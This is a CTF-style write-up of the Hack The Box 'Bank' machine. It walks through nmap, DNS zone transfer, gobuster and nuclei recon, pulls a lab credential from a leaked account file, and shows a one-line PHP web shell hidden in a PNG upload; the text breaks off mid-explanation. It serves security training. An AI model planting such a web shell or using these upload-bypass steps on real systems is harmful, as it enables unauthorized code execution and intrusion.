---
cover: >-
  https://images.unsplash.com/photo-1571840615771-acc2e9f42641?crop=entropy&cs=srgb&fm=jpg&ixid=M3wxOTcwMjR8MHwxfHNlYXJjaHw4fHxiYW5rfGVufDB8fHx8MTcwMjA4MTg3OXww&ixlib=rb-4.0.3&q=85
coverY: 0
---

# HTB: Bank Write-Up

## Recons

### nmap

Let's sniff the target machine to check if there is any opening to break in.

```bash
# Nmap 7.94 scan initiated Sun Nov 12 02:18:04 2023 as: nmap -vvv -Pn -sCV --open -T4 -p0-65535 -oN bank.nmap 10.10.10.29
Nmap scan report for 10.10.10.29
Host is up, received user-set (0.33s latency).
Scanned at 2023-11-12 02:18:04 EST for 84s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAMJ+YATka9wvs0FTz8iNWs6uCiLqSFhmBYoYAorFpozVGkCkU1aEJ7biybFTw/qzS9pbSsaYA+3LyUyvh3BSPGEt1BgGW/H29MuXjkznwVz60JqL4GqaJzYSL3smYYdr3KdJQI/QSvf34WU3pife6LRmJaVk+ETh3wPclyecNtedAAAAFQC1Zb2O2LzvAWf20FdsK8HRPlrx1wAAAIBIBAhLmVd3Tz+o+6Oz39g4Um1le8d3DETINWk3myRvPw8hcnRwAFe1+14h3RX4fr+LKXoR/tYrI138PJyiyl+YtQWhZnJ7j8lqnKRU2YibtnUc44kP9FhUqeAcBNjj4qwG9GyQSWm/Q5CbOokgaa6WfdcnwsUMim0h2Ad8YdU1kAAAAIBy3dOOD8jKHeBdE/oXGG0X9tKSFZv1gPr/kZ7NfqUF0kHU3oZTNK8/2qR0SNHgrZ2cLgKTIuneGS8lauXjC66NNMoUkJcMHpwRkYC0A86LDmhES6OuPsQwAjr1AtUZn97QjYu1d6WPfhTdsRYBuCotgKh2SBkzV1Bcz77Tnp56JA==
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc0rofjHtpSlqkDjjnkEiYcbUrMH0Q4a6PcxqsR3updDGBWu/RK7AGWRSjPn13uil/nl44XF/fkULy7FoXXskByLCHP8FS2gYJApQMvI9n81ERojEA0NIi6VZKP19bl1VFTk7Q5rEPIpab2xqYMBayb1ch7iP95n3iayvHEt/7cSTsddGWKeALi+rrujpnryNViiOIWpqDv+RWtbc2Wuc/FTeGSOt1LBTbtKcLwEehBG+Ym8o8iKTd+zfVudu7v1g3W2Aa3zLuTcePRKLUK3Q2D7k+5aJnWrekpiARQm3NmMkv1NuDLeW3amVBCv6DRJPBqEgSeGMGsnqkR8CKHO9/
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDH30xnPq1XEub/UFQ2KoHXh9LFKMNMkt60xYF3OrEp1Y5XQd0QyeLXwm6tIqWtb0rWda/ivDgmiB4GzCIMf/HQ=
|   256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA8MYjFyo+4OwYGTzeuyNd998y6cOx56mIuciim1cvKh
53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov 12 02:19:28 2023 -- 1 IP address (1 host up) scanned in 83.86 seconds
```

The provided Nmap scan result reveals information about a target host with the IP address 10.10.10.29. Here's a breakdown of the findings:

1.  **SSH Service (Port 22)**:

    * State: Open
    * Service: SSH (Secure Shell)
    * Version: OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8
    * Encryption Key Types:
      * DSA (Digital Signature Algorithm)
      * RSA (Rivest-Shamir-Adleman)
      * ECDSA (Elliptic Curve Digital Signature Algorithm)
      * ED25519 (Edwards-curve Digital Signature Algorithm)
    * Operating System: Ubuntu Linux

    This indicates that the SSH service is available on the host, allowing secure remote access. The version information can be useful for identifying potential vulnerabilities or compatibility issues.
2.  **Domain Service (Port 53)**:

    * State: Open
    * Service: Domain (DNS - Domain Name System)
    * Version: ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)

    The Domain service being open suggests that this host is likely responsible for DNS resolution within the network. The version information can help in assessing potential vulnerabilities or compatibility with other DNS systems.
3.  **HTTP Service (Port 80)**:

    * State: Open
    * Service: HTTP (Hypertext Transfer Protocol)
    * Version: Apache httpd 2.4.7 (Ubuntu)
    * Server Header: Apache/2.4.7 (Ubuntu)
    * HTTP Methods Supported: POST, OPTIONS, GET, HEAD
    * HTTP Title: Apache2 Ubuntu Default Page: It works

    The HTTP service being open indicates that the host is running a web server, serving content over the HTTP protocol. The version information can be valuable for understanding potential vulnerabilities or compatibility issues with web applications running on this server.
4. **Additional Information**:
   * Latency: The host responded with a latency of 0.33 seconds, indicating a relatively quick response time.
   * Operating System: Detected as Linux, with the Common Platform Enumeration (CPE) specifying the Linux kernel.

This Nmap scan provides valuable insights into the services running on the target host, allowing for further analysis and potential identification of security risks or areas of interest for further investigation.

### DNS

#### dig

With a standard DNS tool called 'dig' available in Linux, we can pull it off the following DNS recon on the target machine.

```bash
# get the domain's zone details with dig from dns server 
$ dig @10.10.10.29 bank.htb axfr 

; <<>> DiG 9.19.17-1-Debian <<>> @10.10.10.29 bank.htb axfr
; (1 server found)
;; global options: +cmd
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800
bank.htb.               604800  IN      NS      ns.bank.htb.
bank.htb.               604800  IN      A       10.10.10.29
ns.bank.htb.            604800  IN      A       10.10.10.29
www.bank.htb.           604800  IN      CNAME   bank.htb.
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800
;; Query time: 504 msec
;; SERVER: 10.10.10.29#53(10.10.10.29) (TCP)
;; WHEN: Sun Nov 12 02:49:32 EST 2023
;; XFR size: 6 records (messages 1, bytes 171)

-------------------------------------------------------------------------------

# filter the output a bit more with grep regex
$ dig @10.10.10.29 bank.htb axfr | grep -E '(\w+\.)?\w+\.htb' 
; <<>> DiG 9.19.17-1-Debian <<>> @10.10.10.29 bank.htb axfr
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800
bank.htb.               604800  IN      NS      ns.bank.htb.
bank.htb.               604800  IN      A       10.10.10.29
ns.bank.htb.            604800  IN      A       10.10.10.29
www.bank.htb.           604800  IN      CNAME   bank.htb.
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800

-------------------------------------------------------------------------------

# print only the matches with grep -o
$ dig @10.10.10.29 bank.htb axfr | grep -oE '(\w+\.)?\w+\.htb' 
bank.htb
bank.htb
bank.htb
chris.bank.htb
bank.htb
ns.bank.htb
bank.htb
ns.bank.htb
www.bank.htb
bank.htb
bank.htb
bank.htb
chris.bank.htb

-------------------------------------------------------------------------------

# sort and print only unique with sort -u 
$ dig @10.10.10.29 bank.htb axfr | grep -oE '(\w+\.)?\w+\.htb' | sort -u
bank.htb
chris.bank.htb
ns.bank.htb
www.bank.htb

-------------------------------------------------------------------------------

# translate or replace newline \n with space ' '
$ dig @10.10.10.29 bank.htb axfr | grep -oE '(\w+\.)?\w+\.htb' | sort -u | tr '\n' ' '
bank.htb chris.bank.htb ns.bank.htb www.bank.htb 

-------------------------------------------------------------------------------

# manipulate the output the way we want with awk
$ dig @10.10.10.29 bank.htb axfr | grep -oE '(\w+\.)?\w+\.htb' | sort -u | tr '\n' ' ' | awk '{print "10.10.10.29\t" $1 " " $2 " " $3 " " $4}'
10.10.10.29     bank.htb chris.bank.htb ns.bank.htb www.bank.htb

-------------------------------------------------------------------------------

# copy the output to clipboard with xclip instead of print out
$ dig @10.10.10.29 bank.htb axfr | grep -oE '(\w+\.)?\w+\.htb' | sort -u | tr '\n' ' ' | awk '{print "10.10.10.29\t" $1 " " $2 " " $3 " " $4}' | xclip -selection clipboard

```

The series of commands demonstrate the process of retrieving domain zone details using the `dig` command from a DNS server, filtering the output with `grep`, `sort`, and `awk`, and finally copying the manipulated output to the clipboard using `xclip`. Here's an explanation of each step:

1. **Original `dig` Command**:
   * The initial command requests a zone transfer (`axfr`) for the domain `bank.htb` from the DNS server located at `10.10.10.29`.
2. **Filtered Output with `grep`**:
   * `grep -E '(\w+\.)?\w+\.htb'`: Filters the output to include only lines containing domain names with the `.htb` extension.
3. **Print Matches Only with `grep -o`**:
   * `grep -oE '(\w+\.)?\w+\.htb'`: Prints only the matched domain names, one per line.
4. **Sort and Print Unique Entries with `sort -u`**:
   * `sort -u`: Sorts the domain names alphabetically and prints only unique entries.
5. **Translate Newlines to Spaces with `tr`**:
   * `tr '\n' ' '`: Translates newline characters to spaces, combining all domain names into a single line.
6. **Manipulate Output with `awk`**:
   * `awk '{print "10.10.10.29\t" $1 " " $2 " " $3 " " $4}'`: Formats the output to include the DNS server IP address (`10.10.10.29`) followed by the domain names.
7. **Copy Output to Clipboard with `xclip`**:
   * `xclip -selection clipboard`: Copies the manipulated output to the clipboard for easy pasting into other applications.

Overall, this series of commands provides a streamlined way to retrieve domain zone details from a DNS server, filter and manipulate the output, and then copy it to the clipboard for further use. This can be particularly useful for network administrators or security professionals conducting DNS-related investigations or audits.

To make my life a bit easier and work with DNS, I add the following entry to my local Kali machine's /etc/hosts file.

```bash
$ sudo vi /etc/hosts 
10.10.10.29     bank.htb chris.bank.htb ns.bank.htb www.bank.htb
```

### Web

#### WhatWeb

Since the Nmap scan result shows that the TCP port 80 HTTP is opening, I would like to confirm its operating system and version.

```bash
$ whatweb http://10.10.10.29                                       
http://10.10.10.29 [200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.10.29], Title[Apache2 Ubuntu Default Page: It works]
```

It is a command-line tool called WhatWeb, which is used for web fingerprinting or identifying the technologies used by a website. Here's an analysis of the output:

1. **URL**: http://10.10.10.29
   * This is the URL of the target website being analyzed.
2. **Response Status**: \[200 OK]
   * Indicates that the web server responded with a successful HTTP status code, meaning the request was processed without errors.
3. **Web Server**: Apache \[2.4.7]
   * Specifies the web server software being used, which in this case is Apache version 2.4.7. Apache is a widely used open-source web server software.
4. **Country**: RESERVED \[ZZ]
   * The country field typically provides information about the geographical location of the server based on its IP address. However, in this case, it shows "RESERVED" with the country code "ZZ", which suggests that the country information is not available or reserved.
5. **HTTP Server**: Ubuntu Linux \[Apache/2.4.7 (Ubuntu)]
   * Indicates the underlying operating system and its version, which is Ubuntu Linux. Additionally, it mentions that Apache version 2.4.7 is specifically configured for Ubuntu.
6. **IP Address**: 10.10.10.29
   * Specifies the IP address of the target server.
7. **Title**: Apache2 Ubuntu Default Page: It works
   * Provides the title of the webpage, which is the default page served by Apache on an Ubuntu system. This is often displayed when no specific content is configured for the root URL of the web server.

WhatWeb analysis reveals that the target website is hosted on a server running Apache version 2.4.7 on Ubuntu Linux. The default page for Apache on Ubuntu is being served, indicating that the web server is operational and accessible.

#### Aquatone

```bash
# download aquatone from github
$ wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip

# unzip the zip file
$ unzip aquatone_linux_amd64_1.7.0.zip

# get the oupt to bank.urls for aquatone
$ dig @10.10.10.29 bank.htb axfr | grep -oE '(\w+\.)?\w+\.htb' | sort -u > bank.urls

# it looks like this
$ cat bank.urls 
bank.htb
chris.bank.htb
ns.bank.htb
www.bank.htb

# use sed to substitute or put http:// prefix to every line
$ sed -i 's/^/http:\/\//gi' bank.urls

# verify the sed output
$ cat bank.urls 
http://bank.htb
http://chris.bank.htb
http://ns.bank.htb
http://www.bank.htb

# feed it to aquaton
$ cat bank.urls | ./aquatone 
aquatone v1.7.0 started at 2023-11-12T04:24:36-05:00

Using unreliable Google Chrome for screenshots. Install Chromium for better results.

Targets    : 4
Threads    : 2
Ports      : 80, 443, 8000, 8080, 8443
Output dir : .

http://ns.bank.htb: 200 OK
http://www.bank.htb: 200 OK
http://bank.htb: 200 OK
http://chris.bank.htb: 200 OK
http://ns.bank.htb: screenshot successful
http://www.bank.htb: screenshot successful
http://bank.htb: screenshot successful
http://chris.bank.htb: screenshot successful
Calculating page structures... done
Clustering similar pages... done
Generating HTML report... done

Writing session file...Time:
 - Started at  : 2023-11-12T04:24:36-05:00
 - Finished at : 2023-11-12T04:24:43-05:00
 - Duration    : 7s

Requests:
 - Successful : 4
 - Failed     : 0

 - 2xx : 4
 - 3xx : 0
 - 4xx : 0
 - 5xx : 0

Screenshots:
 - Successful : 4
 - Failed     : 0

Wrote HTML report to: aquatone_report.html

# open aquatone_report.html with firefox
$ firefox aquatone_report.html&

```

It illustrates the process of using Aquatone, a reconnaissance tool, to capture screenshots and generate reports for a list of domain URLs. Here's a breakdown of each step:

1.  **Download Aquatone**:

    * Fetches the Aquatone release from GitHub using `wget`.

    ```
    wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
    ```
2.  **Unzip Aquatone**:

    * Extracts the downloaded Aquatone zip file using `unzip`.

    ```
    unzip aquatone_linux_amd64_1.7.0.zip
    ```
3.  **Retrieve Domain URLs with `dig`**:

    * Performs a zone transfer for the domain `bank.htb` from the DNS server at `10.10.10.29`, filters and sorts unique domain names, and saves them to a file named `bank.urls`.

    ```
    dig @10.10.10.29 bank.htb axfr | grep -oE '(\w+\.)?\w+\.htb' | sort -u > bank.urls
    ```
4.  **Prepend `http://` to URLs with `sed`**:

    * Adds `http://` prefix to each line in `bank.urls`.

    ```
    sed -i 's/^/http:\/\//gi' bank.urls
    ```
5.  **Feed URLs to Aquatone**:

    * Pipes the contents of `bank.urls` to Aquatone for scanning.

    ```
    cat bank.urls | ./aquatone
    ```
6.  **Open Aquatone HTML Report**:

    * Opens the generated HTML report in a web browser (Firefox) for review.

    ```
    firefox aquatone_report.html&
    ```

These commands demonstrate a streamlined process for using Aquatone to perform reconnaissance on a list of domain URLs, capturing screenshots and generating reports for further analysis.

#### Gobuster

```bash
# web scan with gobuster 
$ gobuster dir --threads 100 --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --url http://bank.htb 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bank.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 305] [--> http://bank.htb/uploads/]
/assets               (Status: 301) [Size: 304] [--> http://bank.htb/assets/]
/inc                  (Status: 301) [Size: 301] [--> http://bank.htb/inc/]
/server-status        (Status: 403) [Size: 288]
/balance-transfer     (Status: 301) [Size: 314] [--> http://bank.htb/balance-transfer/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

The output displays the results of a web scan conducted with Gobuster, a popular directory and file brute-forcing tool. Here's an explanation of the scan:

1. **Tool Information**:
   * Gobuster version 3.6 is being used for the scan. Gobuster is a tool used to brute-force: URIs (directories and files) in web sites, DNS subdomains (with wildcard support), Virtual Host names on target web servers, Open Amazon S3 buckets, Open Google Cloud buckets and TFTP servers. Gobuster is useful for pentesters, ethical hackers and forensics experts. It also can be used for security tests.
2. **Scan Configuration**:
   * **URL**: http://bank.htb
   * **Method**: GET
   * **Threads**: 100
   * **Wordlist**: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
   * **Negative Status codes**: 404 (ignore 404 Not Found responses)
   * **User Agent**: gobuster/3.6
   * **Timeout**: 10 seconds
3. **Results**:
   * The scan is performed in directory enumeration mode.
   * Directories or paths found during the scan:
     * **/uploads**: Redirects to http://bank.htb/uploads/
     * **/assets**: Redirects to http://bank.htb/assets/
     * **/inc**: Redirects to http://bank.htb/inc/
     * **/server-status**: Access forbidden (Status: 403 Forbidden)
     * **/balance-transfer**: Redirects to http://bank.htb/balance-transfer/

Gobuster successfully identified several directories and paths on the target website http://bank.htb, along with their corresponding status codes and sizes. This information can be valuable for further reconnaissance and vulnerability assessment, allowing security professionals to explore potentially sensitive areas of the web application. Additionally, the presence of directories like "uploads," "assets," and "balance-transfer" may provide avenues for further investigation or exploitation.

#### Nuclei

```bash
# scan the target with nuclei 
$ nuclei -list bank.urls                                                                      [34/384]
                     __     _                                                    
   ____  __  _______/ /__  (_)                                                   
  / __ \/ / / / ___/ / _ \/ /                                                    
 / / / / /_/ / /__/ /  __/ /                                                     
/_/ /_/\__,_/\___/_/\___/_/   v3.0.2                                                                    	projectdiscovery.io                                              
[INF] nuclei-templates are not installed, installing...                          
[INF] Successfully installed nuclei-templates at /home/vagrant/.local/nuclei-templates                  
[INF] Current nuclei version: v3.0.2 (outdated)                                  
[INF] Current nuclei-templates version: v9.6.9 (latest)                          
[INF] New templates added in latest release: 73                                  
[INF] Templates loaded for current scan: 7278                                    
[INF] Executing 5264 signed templates from projectdiscovery/nuclei-templates     
[WRN] Executing 2028 unsigned templates. Use with caution.                       
[INF] Targets loaded for current scan: 4                                         
[INF] Templates clustered: 1252 (Reduced 4876 Requests)                          
[caa-fingerprint] [dns] [info] ns.bank.htb                                       
[caa-fingerprint] [dns] [info] chris.bank.htb                                    
[caa-fingerprint] [dns] [info] bank.htb                                          
[INF] Using Interactsh Server: oast.live                                         
[options-method] [http] [info] http://www.bank.htb [POST,OPTIONS,GET,HEAD]       
[options-method] [http] [info] http://chris.bank.htb [POST,OPTIONS,GET,HEAD]     
[options-method] [http] [info] http://ns.bank.htb [POST,OPTIONS,GET,HEAD]        
[apache-detect] [http] [info] http://chris.bank.htb [Apache/2.4.7 (Ubuntu)]      
[default-apache-test-all] [http] [info] http://chris.bank.htb [Apache/2.4.7 (Ubuntu)]                   
[default-apache2-ubuntu-page] [http] [info] http://chris.bank.htb       [apache-detect] [http] [info] http://ns.bank.htb [Apache/2.4.7 (Ubuntu)]       
[default-apache-test-all] [http] [info] http://ns.bank.htb [Apache/2.4.7 (Ubuntu)]                      
[default-apache2-ubuntu-page] [http] [info] http://ns.bank.htb          [apache-detect] [http] [info] http://www.bank.htb [Apache/2.4.7 (Ubuntu)]                
[default-apache-test-all] [http] [info] http://www.bank.htb [Apache/2.4.7 (Ubuntu)]                     
[default-apache2-ubuntu-page] [http] [info] http://www.bank.htb
[CVE-2021-28164] [http] [medium] http://www.bank.htb/WEB-INF/web.xml
[CVE-2021-28164] [http] [medium] http://ns.bank.htb/WEB-INF/web.xml
[CVE-2021-28164] [http] [medium] http://bank.htb/WEB-INF/web.xml
[CVE-2021-28164] [http] [medium] http://chris.bank.htb/WEB-INF/web.xml
[http-missing-security-headers:permissions-policy] [http] [info] http://chris.bank.htb
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://www.bank.htb
[http-missing-security-headers:x-frame-options] [http] [info] http://chris.bank.htb
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://chris.bank.htb
[http-missing-security-headers:referrer-policy] [http] [info] http://chris.bank.htb
[http-missing-security-headers:clear-site-data] [http] [info] http://chris.bank.htb
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://chris.bank.htb
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://chris.bank.htb
[http-missing-security-headers:strict-transport-security] [http] [info] http://chris.bank.htb
[http-missing-security-headers:content-security-policy] [http] [info] http://chris.bank.htb
[http-missing-security-headers:x-content-type-options] [http] [info] http://chris.bank.htb
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://chris.bank.htb
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://www.bank.htb
[http-missing-security-headers:permissions-policy] [http] [info] http://www.bank.htb
[http-missing-security-headers:content-security-policy] [http] [info] http://www.bank.htb
[http-missing-security-headers:x-frame-options] [http] [info] http://www.bank.htb
[http-missing-security-headers:x-content-type-options] [http] [info] http://www.bank.htb
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://www.bank.htb
[http-missing-security-headers:referrer-policy] [http] [info] http://www.bank.htb
[http-missing-security-headers:clear-site-data] [http] [info] http://www.bank.htb
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://www.bank.htb
[http-missing-security-headers:strict-transport-security] [http] [info] http://www.bank.htb
[http-missing-security-headers:strict-transport-security] [http] [info] http://ns.bank.htb
[http-missing-security-headers:content-security-policy] [http] [info] http://ns.bank.htb
[http-missing-security-headers:x-frame-options] [http] [info] http://ns.bank.htb
[http-missing-security-headers:referrer-policy] [http] [info] http://ns.bank.htb
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://ns.bank.htb
[http-missing-security-headers:permissions-policy] [http] [info] http://ns.bank.htb
[http-missing-security-headers:x-content-type-options] [http] [info] http://ns.bank.htb
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://ns.bank.htb
[http-missing-security-headers:clear-site-data] [http] [info] http://ns.bank.htb
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://ns.bank.htb
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://ns.bank.htb
[http-missing-security-headers:strict-transport-security] [http] [info] http://bank.htb/login.php
[http-missing-security-headers:x-content-type-options] [http] [info] http://bank.htb/login.php
[http-missing-security-headers:clear-site-data] [http] [info] http://bank.htb/login.php
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://bank.htb/login.php
[http-missing-security-headers:content-security-policy] [http] [info] http://bank.htb/login.php
[http-missing-security-headers:permissions-policy] [http] [info] http://bank.htb/login.php
[http-missing-security-headers:x-frame-options] [http] [info] http://bank.htb/login.php
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://bank.htb/login.ph
p
[http-missing-security-headers:referrer-policy] [http] [info] http://bank.htb/login.php
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://bank.htb/login.php
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://bank.htb/login.php
[missing-sri] [http] [info] http://bank.htb/login.php [https://code.jquery.com/jquery.js]
[waf-detect:apachegeneric] [http] [info] http://bank.htb/
[waf-detect:apachegeneric] [http] [info] http://chris.bank.htb/
[waf-detect:apachegeneric] [http] [info] http://ns.bank.htb/
[waf-detect:apachegeneric] [http] [info] http://www.bank.htb/
[ssh-password-auth] [js] [info] bank.htb:22
[ssh-auth-methods] [js] [info] www.bank.htb:22 [["publickey","password"]]
[ssh-auth-methods] [js] [info] ns.bank.htb:22 [["publickey","password"]]
[ssh-auth-methods] [js] [info] chris.bank.htb:22 [["publickey","password"]]
[ssh-auth-methods] [js] [info] bank.htb:22 [["publickey","password"]]
[ssh-server-enumeration] [js] [info] www.bank.htb:22 [SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.8]
[ssh-server-enumeration] [js] [info] bank.htb:22 [SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.8]
[ssh-server-enumeration] [js] [info] chris.bank.htb:22 [SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.8]
[ssh-server-enumeration] [js] [info] ns.bank.htb:22 [SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.8]
[ssh-password-auth] [js] [info] chris.bank.htb:22
[ssh-password-auth] [js] [info] ns.bank.htb:22
[openssh-detect] [tcp] [info] bank.htb:22 [SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.8]
[openssh-detect] [tcp] [info] ns.bank.htb:22 [SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.8]
[INF] Skipped www.bank.htb:80 from target list as found unresponsive 30 times
[INF] Skipped ns.bank.htb:80 from target list as found unresponsive 30 times
[INF] Skipped chris.bank.htb:80 from target list as found unresponsive 31 times
[INF] Skipped bank.htb:80 from target list as found unresponsive 31 times
```

The command executes a scan using Nuclei against the target URLs listed in `bank.urls`. Here's a breakdown of the process and the findings:

1. **Nuclei Installation and Version Check**:
   * Nuclei-templates are installed, and the current version of Nuclei (`v3.0.2`) and the loaded templates (`v9.6.9`) are displayed.
2. **Template Execution**:
   * Nuclei executes a total of 7278 templates for the scan, comprising both signed and unsigned templates.
   * The templates are clustered to reduce the number of requests, resulting in 1252 clusters and 4876 reduced requests.
3. **Targets Loaded and Interactsh Server**:
   * Four targets are loaded for the current scan, which correspond to the URLs listed in `bank.urls`.
   * Nuclei utilizes an Interactsh Server at `oast.live` during the scan.
4. **Detection of HTTP Methods and Web Servers**:
   * Nuclei identifies various HTTP methods supported by the target URLs, such as POST, OPTIONS, GET, and HEAD.
   * Detection of web servers reveals that the targets are running Apache/2.4.7 on Ubuntu.
5. **Identification of Vulnerabilities and Misconfigurations**:
   * Nuclei detects several vulnerabilities and misconfigurations across the target URLs, including:
     * Missing security headers like `X-Frame-Options`, `Content-Security-Policy`, and `Strict-Transport-Security`.
     * Exposure of sensitive files like `WEB-INF/web.xml`, potentially indicating information disclosure vulnerabilities (e.g., CVE-2021-28164).
     * Detection of weak SSH configurations, including password authentication and supported authentication methods.
6. **Additional Observations**:
   * Nuclei skips some target URLs (`www.bank.htb`, `ns.bank.htb`, `chris.bank.htb`, `bank.htb`) due to unresponsiveness after multiple attempts.

The scan provides valuable insights into potential security issues and vulnerabilities present in the target URLs. These findings can aid in securing the web applications and network infrastructure against various threats and attacks. Nuclei proves to be a versatile and effective tool for security scanning, offering comprehensive coverage of web and network security assessment.

### Analysis

```bash
# number of files ending with .acc
$ curl -sL http://bank.htb/balance-transfer | grep -i '.acc' | wc -l
999

-------------------------------------------------------------------------------

# number of files not ending with .acc
$ curl -sL http://bank.htb/balance-transfer | grep -iv '.acc' | wc -l
15

-------------------------------------------------------------------------------

# get the first 10 line after sorting at second field
$ curl -sL http://bank.htb/balance-transfer | grep -i '.acc' | grep -ioE '[a-f0-9]{32}\.acc.*"right">.+ ' | cut -d '>' -f1,7 | tr '">' ' ' | sort -k2 | head
68576f20e9732f1b2edc4df5b8533230.acc  257 
09ed7588d1cd47ffca297cc7dac22c52.acc  581 
941e55bed0cb8052e7015e7133a5b9c7.acc  581 
052a101eac01ccbf5120996cdc60e76d.acc  582 
0d64f03e84187359907569a43c83bddc.acc  582 
10805eead8596309e32a6bfe102f7b2c.acc  582 
20fd5f9690efca3dc465097376b31dd6.acc  582 
346bf50f208571cd9d4c4ec7f8d0b4df.acc  582 
70b43acf0a3e285c423ee9267acaebb2.acc  582 
780a84585b62356360a9495d9ff3a485.acc  582

-------------------------------------------------------------------------------

# stats on the byte sizes
$ curl -sL http://bank.htb/balance-transfer | grep -i '.acc' | grep -ioE '[a-f0-9]{32}\.acc.*"right">.+ ' | cut -d '>' -f1,7 | tr '">' ' ' | cut -d ' ' -f3 | sort | uniq -c
      1 257
      2 581
     11 582
     97 583
    590 584
    298 585

-------------------------------------------------------------------------------

# get the one file of 257 byte size 
$ curl -sL http://bank.htb/balance-transfer | grep -i '.acc' | grep -ioE '[a-f0-9]{32}\.acc.*"right">.+ ' | cut -d '>' -f1,7 | tr '">' ' ' | grep -iE '\b257\b'
68576f20e9732f1b2edc4df5b8533230.acc  257

-------------------------------------------------------------------------------

# check out the file
$ curl -sL http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===

-------------------------------------------------------------------------------

# record the creds
vi creds.txt
chris@bank.htb:!##HTBB4nkP4ssw0rd!##

-------------------------------------------------------------------------------

# now login with the username and password at http://bank.htb 
# you should be able to login to the account
# Start looking for the place to upload files since we know that there is a directory for upload. 
# Go to Support page in Chris's account and test upload a random png file while Burp Suite intercepts the traffic. It will capture the request and response for the upload.

-------------------------------------------------------------------------------

# craft the request with first three lines started with PNG magic byte and place php code execution inside the png file as below. Note that \n "Show non-printable chars" must be turned on to see the same output.
<?php system($_REQUEST["cmd"]); ?>

-------------------------------------------------------------------------------

# with further enumertion, check the source code of bank.htb/support.php page and find there is a DEBUG block in it. 
<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
```

It's a series of actions against the target URL `http://bank.htb/balance-transfer`. Let's break down each step:

1. **Counting Files Ending with `.acc`**:
   * It uses `curl` to fetch the HTML content from the specified URL.
   * `grep` is used to filter lines containing `.acc` case-insensitively.
   * `wc -l` counts the number of lines, which corresponds to the number of files ending with `.acc`.
   * Result: 999 files ending with `.acc`.
2. **Counting Files Not Ending with `.acc`**:
